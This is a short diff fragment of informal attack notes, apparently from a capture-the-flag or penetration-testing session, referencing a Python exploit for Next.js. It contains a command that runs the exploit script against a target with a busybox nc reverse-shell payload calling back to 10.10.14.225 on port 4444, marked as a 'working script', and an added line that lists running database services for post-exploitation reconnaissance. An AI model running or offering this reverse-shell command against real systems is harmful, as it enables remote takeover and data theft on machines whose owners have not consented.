@@ -27,3 +27,6 @@ requests.post(BASE_URL, files=files, headers=headers)
 //////// python exploit for next.js /////
 a cringe ass minimal linux needs busybox nc , also alpine is cringe aswell
 python3 shit.py http://ip "busybox nc 10.10.14.225 4444 -e /bin/bash" /// working script
+
+
+ps aux | grep -Ei 'postgres|mysqld|mariadb|mongod|redis|sqlite' /// checks for databases as a running service
